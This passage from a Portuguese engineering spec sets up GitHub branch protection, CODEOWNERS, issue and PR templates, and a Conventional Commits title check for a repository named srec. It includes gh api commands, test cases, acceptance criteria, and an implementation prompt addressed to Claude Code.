PR.** O GitHub registra o bypass na timeline, e a auditoria da N3 vai ver.
```

### 9. Aplicar a configuração — comandos

Não há arquivo versionado para proteção de branch: é estado da API. Os comandos
abaixo ficam nesta spec para que o estado seja reproduzível, e o aceite confere
lendo de volta.

**9.1 — Colaboradores com escrita.** Antes de tudo: dono de código sem permissão
de escrita é entrada ignorada.

```bash
for u in gabrielcarvallho adrian-cesar RenatoColin Diegonessler; do
  gh api -X PUT "/repos/igorSeberino/srec/collaborators/${u}" -f permission=push
done

# Conferir que CODEOWNERS não tem dono inválido. Precisa sair vazio.
gh api /repos/igorSeberino/srec/codeowners/errors | jq '.errors'
```

**9.2 — Política de merge e mensagem de commit.**

```bash
gh api -X PATCH /repos/igorSeberino/srec \
  -F allow_squash_merge=true \
  -F allow_merge_commit=false \
  -F allow_rebase_merge=false \
  -F delete_branch_on_merge=true \
  -F allow_auto_merge=true \
  -f squash_merge_commit_title=PR_TITLE \
  -f squash_merge_commit_message=PR_BODY
```

**9.3 — Proteção de `main`.** O `PUT` substitui a configuração inteira: as
quatro chaves de primeiro nível são obrigatórias, mesmo quando nulas.

```bash
gh api -X PUT /repos/igorSeberino/srec/branches/main/protection \
  -H 'Accept: application/vnd.github+json' \
  --input - <<'JSON'
{
  "required_status_checks": {
    "strict": true,
    "contexts": [
      "Backend — lint, formato, auditoria e testes",
      "Frontend — lint, formato e build",
      "Docker — build e smoke test do compose",
      "Título do PR (Conventional Commits)"
    ]
  },
  "enforce_admins": false,
  "required_pull_request_reviews": {
    "dismiss_stale_reviews": true,
    "require_code_owner_reviews": true,
    "required_approving_review_count": 1,
    "require_last_push_approval": true,
    "bypass_pull_request_allowances": {
      "users": [],
      "teams": [],
      "apps": []
    }
  },
  "restrictions": null,
  "required_linear_history": true,
  "allow_force_pushes": false,
  "allow_deletions": false,
  "block_creations": false,
  "required_conversation_resolution": true,
  "lock_branch": false,
  "allow_fork_syncing": false
}
JSON
```

Três armadilhas desse `PUT`, todas verificáveis na leitura de volta:

* **`contexts` aceita qualquer string.** Um nome com um caractere diferente do
  `name:` do job em `.github/workflows/ci.yml` fica "expected" para sempre e
  **bloqueia todos os PRs** sem nunca reportar. Os travessões `—` dos nomes de
  OPS-03 são travessão longo, não hífen. Copie e cole, não digite.
* **Só exija check que exista.** `Docker — build e smoke test do compose` vem de
  OPS-01. Se OPS-01 não estiver em `main`, remova essa linha do JSON e
  acrescente depois, com um `PUT` novo.
* **`strict: true`** obriga a branch a estar atualizada com `main` antes do
  merge. É o que queremos em Trunk-Based Development com branch curta; com
  branch de duas semanas seria tortura, e é mais um argumento para o PR pequeno.

**9.4 — Ler de volta.** O que vale é isto, não a intenção.

```bash
gh api /repos/igorSeberino/srec/branches/main/protection | jq '{
  checks: .required_status_checks.contexts,
  strict: .required_status_checks.strict,
  aprovacoes: .required_pull_request_reviews.required_approving_review_count,
  code_owners: .required_pull_request_reviews.require_code_owner_reviews,
  dismiss_stale: .required_pull_request_reviews.dismiss_stale_reviews,
  last_push: .required_pull_request_reviews.require_last_push_approval,
  conversas: .required_conversation_resolution.enabled,
  linear: .required_linear_history.enabled,
  force_push: .allow_force_pushes.enabled,
  admins: .enforce_admins.enabled
}'
```

### 10. `docs/time/overview.md` — alterar uma linha

Linha 123 chama a label de `débito técnico`. A label que existe no repositório é
`debito tecnico`, sem acento, e é a que os formulários usam. Corrigir o texto —
o repositório vence o documento, conforme a convenção da N2.

## Testes

Workflow e configuração se validam executando. Cada caso abaixo tem um "antes"
medido no repositório recebido.

### Caso 1 — `main` recusa push direto

```bash
git checkout main && git pull --ff-only origin main
echo '' >> README.md
git commit -am 'chore: testar protecao de branch'
git push origin main
# ANTES: push aceito.
# DEPOIS: remote: error: GH006: Protected branch update failed for refs/heads/main.
#         At least 1 approving review is required.
git reset --hard origin/main
```

### Caso 2 — PR sem aprovação não mescla

Abrir um PR de teste a partir de `chore/branch-protection-smoke` com uma linha
no `README.md` e tentar `gh pr merge --squash`.

* **ANTES:** mescla.
* **DEPOIS:** recusa, listando o que falta — aprovação de dono de código e os
  4 checks.

### Caso 3 — o QA é convocado automaticamente

Abrir PRs de teste tocando pastas diferentes e conferir a lista de revisores
solicitados:

```bash
gh pr view <n> --json reviewRequests --jq '.reviewRequests[].login'
```

| Arquivo tocado no PR de teste | Revisores esperados |
|---|---|
| `server/src/app.js` | `igorSeberino`, `adrian-cesar` |
| `client/src/App.jsx` | `igorSeberino`, `RenatoColin` |
| `.github/workflows/ci.yml` | `igorSeberino`, `gabrielcarvallho` |
| `docs/produto/requisitos.md` | `igorSeberino`, `Diegonessler` |
| `README.md` | `igorSeberino` |

O autor nunca aparece na própria lista — é o GitHub que o remove, e é a
confirmação prática da regra de auto-aprovação.

### Caso 4 — o validador de título reprova e aprova o que deve

Rodar o mesmo `grep` do workflow localmente, sem abrir PR:

```bash
TIPOS='feat|fix|refactor|docs|test|chore|perf|build|ci|style|revert'
PADRAO="^(${TIPOS})(\([a-z0-9][a-z0-9._/-]*\))?!?: .+$"
testar() { printf '%s' "$1" | grep -Eq "$PADRAO" && echo "ok   | $1" || echo "FALHA| $1"; }

testar 'fix(reservations): impedir dupla reserva concorrente'
testar 'refactor(client): extrair formulário de reserva de App.jsx'
testar 'ci: subir postgres no job de backend'
testar 'docs(qa): adicionar roteiro de regressão manual'
testar 'feat!: migrar timestamps para TIMESTAMPTZ'
testar 'atualizado arquivos'
testar 'Fix: corrige bug'
testar 'fix:sem espaco'
testar 'fix(Reservations): escopo em maiúscula'
```

| # | Título | Esperado |
|---|---|---|
| T-01 | `fix(reservations): impedir dupla reserva concorrente` | **passa** |
| T-02 | `refactor(client): extrair formulário de reserva de App.jsx` | **passa** |
| T-03 | `ci: subir postgres no job de backend` | **passa** |
| T-04 | `docs(qa): adicionar roteiro de regressão manual` | **passa** |
| T-05 | `feat!: migrar timestamps para TIMESTAMPTZ` | **passa** (breaking change) |
| T-06 | `atualizado arquivos` | **reprova** — sem tipo |
| T-07 | `Fix: corrige bug` | **reprova** — tipo em maiúscula |
| T-08 | `fix:sem espaco` | **reprova** — falta o espaço depois dos dois-pontos |
| T-09 | `fix(Reservations): escopo em maiúscula` | **reprova** — escopo precisa ser minúsculo |
| T-10 | `fix: Corrigir o status` | **reprova** — descrição começa em maiúscula |
| T-11 | `fix: corrigir o status.` | **reprova** — termina em ponto |
| T-12 | `fix: ` + 70 caracteres de descrição | **reprova** — acima de 72 |
| T-13 | `fix(reservations): adicionado validação de janela` | **passa com aviso** de particípio |

T-13 é deliberado: a heurística de imperativo avisa e não reprova. Reprovar
morfologia do português em CI gera falso positivo, e falso positivo em portão
obrigatório ensina o time a contornar o portão.

### Caso 5 — conversa não resolvida bloqueia

No PR de teste, o QA abre um comentário em linha e aprova. O botão de merge
continua bloqueado até o comentário ser marcado como resolvido.

* **ANTES:** comentário não tinha efeito nenhum sobre o merge.

### Caso 6 — formulários aparecem e aplicam label

```bash
gh issue create --repo igorSeberino/srec --web
# Esperado: três opções (Bug do cliente, Débito técnico, Tarefa de refatoração),
# e NENHUMA opção de issue em branco.

# Depois de criar uma issue de teste pelo formulário de bug:
gh issue view <n> --json labels --jq '.labels[].name'
# => "bug do cliente", "N2"

# Triagem do PO: aplicar o que o dropdown informou
gh issue edit <n> --add-label 'sev: alto' --add-label 'area: backend'
```

### Caso 7 — o bypass do QA funciona e deixa rastro

Com o Igor autenticado, abrir um PR que toque **só** `README.md` e tentar
mesclar. Esperado: a proteção reclama da falta de aprovação de dono de código
(ele é o único dono e é o autor), o merge só sai pelo bypass de admin, e a
timeline do PR registra o bypass. Esse é o cenário descrito na seção "Decisão";
executá-lo uma vez, de propósito, é o que impede a descoberta no dia da entrega.

### Caso 8 — nenhum check inexistente na lista

```bash
# Nomes exigidos
gh api /repos/igorSeberino/srec/branches/main/protection \
  --jq '.required_status_checks.contexts[]' | sort > /tmp/exigidos.txt

# Nomes que a CI realmente publica (última execução em main)
gh api "/repos/igorSeberino/srec/commits/main/check-runs" \
  --jq '.check_runs[].name' | sort -u > /tmp/publicados.txt

comm -23 /tmp/exigidos.txt /tmp/publicados.txt
# Precisa sair VAZIO. Qualquer linha aqui é um check que bloqueia para sempre.
```

## Critérios de aceite

* [ ] `.github/CODEOWNERS` existe, tem `@igorSeberino` em **todas** as linhas e
      em primeiro lugar, e os donos por pasta são `/server/` → `@adrian-cesar`,
      `/client/` → `@RenatoColin`, `/.github/` e os arquivos de Docker →
      `@gabrielcarvallho`, `/docs/` → `@Diegonessler`.
* [ ] `gh api /repos/igorSeberino/srec/codeowners/errors` devolve lista de erros
      **vazia**.
* [ ] Os quatro colaboradores têm permissão `push`, conferido por
      `gh api /repos/igorSeberino/srec/collaborators`.
* [ ] `.github/pull_request_template.md` existe e traz os **7** itens de DoD do
      autor mais a seção separada do QA; "aprovado pelo QA" **não** é caixa do
      autor.
* [ ] O template de PR tem a tabela de antes/depois com coluna de comando.
* [ ] `.github/ISSUE_TEMPLATE/` tem os **três** formulários em YAML mais
      `config.yml` com `blank_issues_enabled: false`.
* [ ] Cada formulário usa **somente** labels que já existem no repositório
      (conferido contra `gh label list`): nenhuma label nova é criada por esta
      spec.
* [ ] O formulário de refatoração exige "métrica antes" e "métrica alvo" como
      campos obrigatórios.
* [ ] O formulário de bug exige arquivo e linha, reprodução, resultado esperado
      e resultado obtido como campos obrigatórios.
* [ ] `.github/workflows/pr-title.yml` existe, dispara em
      `opened, edited, reopened, synchronize`, lê o título por `env:` (nunca
      interpolado no `run:`) e tem `permissions: contents: read`.
* [ ] Os 13 casos T-01 a T-13 foram executados e o resultado bate com a tabela.
* [ ] Proteção de `main` lida de volta pela API, com: 1 aprovação,
      `require_code_owner_reviews: true`, `dismiss_stale_reviews: true`,
      `require_last_push_approval: true`,
      `required_conversation_resolution: true`, `required_linear_history: true`,
      `allow_force_pushes: false`, `allow_deletions: false`.
* [ ] `required_status_checks.contexts` contém exatamente os 4 checks, com o
      nome idêntico ao `name:` dos jobs, e **não** contém
      `Relatório de qualidade (não bloqueante na Fase 1)`.
* [ ] O Caso 8 sai vazio: nenhum check exigido que a CI não publique.
* [ ] Só squash merge habilitado, com `squash_merge_commit_title=PR_TITLE`.
* [ ] Push direto em `main` é rejeitado (Caso 1 executado, saída colada no PR).
* [ ] `docs/time/fluxo-tbd.md` existe e documenta os checks obrigatórios e a
      regra de bypass; o link de `docs/time/overview.md:157` deixa de estar
      quebrado.
* [ ] `docs/time/overview.md` passa a citar a label `debito tecnico`, sem
      acento.
* [ ] Este próprio PR foi mesclado **pelo fluxo novo**: aprovado por
      `@igorSeberino` (QA), com os 4 checks verdes e squash merge.

O último item é o teste de verdade da spec: se a configuração não permite
mesclar o PR que a cria, ela está errada.

## Passo a passo TBD

```bash
# 1. Branch
git checkout main
git pull --ff-only origin main
git checkout -b chore/branch-protection-and-templates

# 2. Conferir o terreno ANTES de escrever (os números vão para o corpo do PR)
gh label list --repo igorSeberino/srec --limit 50
gh api /repos/igorSeberino/srec/branches/main/protection   # espera-se 404
ls .github/

# 3. CODEOWNERS
git add .github/CODEOWNERS
git commit -m "chore(github): definir donos de codigo com o QA em todas as pastas"

# 4. Template de PR com o checklist de Definition of Done
git add .github/pull_request_template.md
git commit -m "chore(github): adicionar template de PR com a definition of done"

# 5. Formulários de issue
git add .github/ISSUE_TEMPLATE
git commit -m "chore(github): adicionar formularios de bug, debito tecnico e refatoracao"

# 6. Validador de título — rodar o Caso 4 local ANTES de commitar
#    (os 13 títulos T-01..T-13 da seção Testes)
git add .github/workflows/pr-title.yml
git commit -m "ci: validar titulo do PR contra conventional commits"

# 7. Documentação do portão
git add docs/time/fluxo-tbd.md docs/time/overview.md
git commit -m "docs(time): documentar o portao do PR e corrigir o nome da label de debito"

# 8. Publicar e abrir o PR (ainda SEM proteção: este PR entra pelo fluxo antigo)
git push -u origin chore/branch-protection-and-templates
gh pr create --fill
# Conferir que o check "Título do PR (Conventional Commits)" aparece e passa.

# 9. Só DEPOIS do merge: aplicar a configuração do repositório
#    (proteção que exige um check cujo workflow não está em main bloqueia tudo)
for u in gabrielcarvallho adrian-cesar RenatoColin Diegonessler; do
  gh api -X PUT "/repos/igorSeberino/srec/collaborators/${u}" -f permission=push
done
gh api /repos/igorSeberino/srec/codeowners/errors | jq '.errors'

gh api -X PATCH /repos/igorSeberino/srec \
  -F allow_squash_merge=true -F allow_merge_commit=false -F allow_rebase_merge=false \
  -F delete_branch_on_merge=true -F allow_auto_merge=true \
  -f squash_merge_commit_title=PR_TITLE -f squash_merge_commit_message=PR_BODY

# 10. Proteção (JSON da seção "Alterações", item 9.3)
gh api -X PUT /repos/igorSeberino/srec/branches/main/protection \
  -H 'Accept: application/vnd.github+json' --input protecao-main.json

# 11. Ler de volta e executar os Casos 1, 2, 3, 5, 6, 7 e 8
gh api /repos/igorSeberino/srec/branches/main/protection | jq '...'
```

A ordem dos passos 8 e 9 **não é negociável**: ativar `required_status_checks`
com `Título do PR (Conventional Commits)` antes de o workflow estar em `main`
deixa o próprio PR desta spec impossível de mesclar, e o conserto exige
desativar a proteção — justamente o movimento que esta spec existe para evitar.

Corpo do PR (colar e preencher):

```
Fecha #20

## O que muda
O processo sai da cabeça das pessoas e entra no GitHub: CODEOWNERS com o QA como
dono de tudo, proteção de `main` exigindo PR com 1 aprovação de dono de código,
conversas resolvidas e 4 checks verdes, três formulários de issue, template de
PR com a Definition of Done e um workflow que valida o título contra
Conventional Commits.

## Antes / depois
| Métrica | Antes (medido) | Depois |
|---|---|---|
| Templates de issue | 0 | 3 formulários YAML + config.yml |
| Template de PR | 0 | 1, com os 8 itens de DoD |
| `CODEOWNERS` | não existe | 11 regras, QA em todas |
| Proteção de `main` | não configurada | PR + 1 aprovação + code owners + conversas + 4 checks |
| Push direto em `main` | aceito | rejeitado (GH006) |
| Aprovação obrigatória do QA | nenhuma | 100 % dos PRs |
| Padrão de commit validado | nunca | título do PR na CI, e o título vira a mensagem do squash |
| Issues no repositório | 0 | <preencher> |
| Colaboradores com escrita | <preencher> | 5 |

## Prova
<colar: saída do Caso 1 (GH006), do Caso 4 (T-01..T-13), e o jq da proteção lida de volta>

## Para @igorSeberino (QA)
Leia a seção "Decisão" da spec antes de aprovar. Dois pontos que afetam você
diretamente:
1. Você é dono de tudo via `*`, e os PRs de QA-01..QA-04 serão aprovados pelo
   segundo dono da área tocada (Adrian em /server/, Diego em /docs/) — porque o
   GitHub não permite auto-aprovação.
2. `enforce_admins` está em `false` de propósito, para PRs seus que toquem só
   arquivos da raiz. O bypass fica registrado na timeline do PR. A regra de uso
   está em docs/time/fluxo-tbd.md.

## Rubrica
3,0 — Processo, Git & Documentação → 1,5 pt (branches, PRs aprovados pelo QA,
padrões de commit).
```

## Prompt para o Claude Code

```
Implemente a spec OPS-05 deste repositório.

Leia primeiro, por inteiro:
- docs/specs/ops-05-branch-protection-and-templates/implementacao.md
- docs/time/overview.md (a Definition of Done, linhas 100-111, e a matriz RACI)
- docs/auditoria/metricas-baseline.md (seção "Processo e histórico")
- .github/workflows/ci.yml (os nomes dos jobs, que são os required checks)

Carregue a skill de DevOps/CI do time em .claude/skills/ antes de começar.

Crie a branch chore/branch-protection-and-templates e entregue os arquivos da
seção "Alterações", um commit por etapa, com as mensagens exatas da seção
"Passo a passo TBD".

Antes de escrever, CONFIRA no repositório, não presuma:
1. `gh label list --repo igorSeberino/srec --limit 50`. Os formulários só podem
   usar labels que JÁ existem. Se alguma das 15 labels da spec não existir,
   PARE e me diga qual — não crie label nova nesta branch.
2. Os nomes dos jobs em .github/workflows/ci.yml. Os `contexts` da proteção
   precisam ser idênticos, inclusive os travessões longos (—). Copie, não digite.
3. Se o job "Docker — build e smoke test do compose" existe em main. Se OPS-01
   não estiver mesclada, tire esse context do JSON de proteção.

Regras não negociáveis:
- @igorSeberino aparece em TODAS as linhas do CODEOWNERS, em primeiro lugar. Em
  CODEOWNERS vale a última linha que casa: uma linha "/server/ @adrian-cesar"
  sozinha tiraria o QA do portão do backend.
- No workflow pr-title.yml, o título do PR vem por `env:`, NUNCA interpolado
  dentro do `run:`. Interpolar é injeção de comando.
- Os tipos de evento do pull_request precisam incluir `edited`, senão corrigir o
  título não reexecuta o check.
- A heurística de imperativo só AVISA (::warning::), nunca reprova.
- NÃO rode os comandos `gh api` de proteção de branch nem de colaboradores.
  Deixe-os em um arquivo protecao-main.json versionado e me diga para rodar
  depois do merge. Ativar a proteção antes de o workflow estar em main trava o
  próprio PR.
- Código, nomes de arquivo e identificadores em inglês; textos de formulário,
  comentários e mensagens de commit em português, no imperativo.

Ao terminar, rode e me mostre a saída REAL:
  ls -R .github/
  # os 13 casos T-01..T-13 do Caso 4, com o grep do próprio workflow
  gh label list --repo igorSeberino/srec --limit 50

Depois me responda, com número:
- quantas regras o CODEOWNERS tem e em quantas delas @igorSeberino aparece
- quantos campos obrigatórios cada formulário tem
- quais dos 13 títulos de teste passaram, reprovaram e passaram com aviso
- quais labels usadas nos formulários você confirmou que existem

Não invente saída de comando. Se `gh` não estiver autenticado, diga, e entregue
os arquivos sem os passos de API.
```
